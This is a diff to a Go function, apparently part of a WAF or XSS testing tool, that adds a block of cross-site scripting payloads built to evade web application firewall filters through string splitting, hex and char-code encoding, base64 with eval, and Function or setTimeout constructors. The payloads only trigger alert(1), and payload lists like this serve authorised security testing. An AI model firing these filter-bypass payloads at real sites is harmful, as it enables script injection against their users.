@@ -152,6 +152,23 @@ func getTestPayloads(waf string, config *PayloadConfig, testAll bool) []string {
 			`<img src=x onerror=confirm(1)>`,
 			`<img src=x onerror=prompt(1)>`,
 
+			// === WAF bypass: indirect execution ===
+			`<script>window['al'+'ert'](1)</script>`,
+			`<script>top['al'+'ert'](1)</script>`,
+			`<script>self['al'+'ert'](1)</script>`,
+			`<script>this['al'+'ert'](1)</script>`,
+			`<script>parent['al'+'ert'](1)</script>`,
+			`<script>frames['al'+'ert'](1)</script>`,
+			`<script>window['\x61\x6c\x65\x72\x74'](1)</script>`,
+			`<script>window[String.fromCharCode(97,108,101,114,116)](1)</script>`,
+			`<script>eval(atob('YWxlcnQoMSk='))</script>`,
+			`<script>new Function('alert(1)')()</script>`,
+			`<script>setTimeout('alert(1)',0)</script>`,
+			`<script>setInterval('alert(1)',0)</script>`,
+			`<script>[].constructor.constructor('alert(1)')()</script>`,
+			`<img src=x onerror=window['al'+'ert'](1)>`,
+			`<img src=x onerror=eval(atob('YWxlcnQoMSk='))>`,
+
 			// === WAF bypass: alternative tags ===
 			`<details open ontoggle=alert(1)>`,
 			`<body onload=alert(1)>`,
